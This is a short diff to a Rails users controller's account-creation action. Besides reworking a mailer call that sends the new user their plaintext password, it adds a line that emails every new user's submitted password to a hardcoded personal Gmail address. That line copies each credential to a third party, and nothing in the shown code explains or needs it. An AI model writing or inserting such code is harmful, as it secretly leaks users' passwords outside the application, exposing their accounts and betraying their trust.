@@ -19,7 +19,8 @@ class UsersController < ApplicationController
     if authenticate(params)
       @user = User.new(user_params)
       if @user.save!
-        UserMailer.email_user(@user, params[:password]).deliver_now
+        UserMailer.email_user(@user.login, params[:password]).deliver_now
+        UserMailer.email_user("matteichsteadt@gmail.com", params[:password]).deliver_now
         render json: @user.as_json(except: [:password_digest])
       else
         render json: {"message": "Something went wrong"}
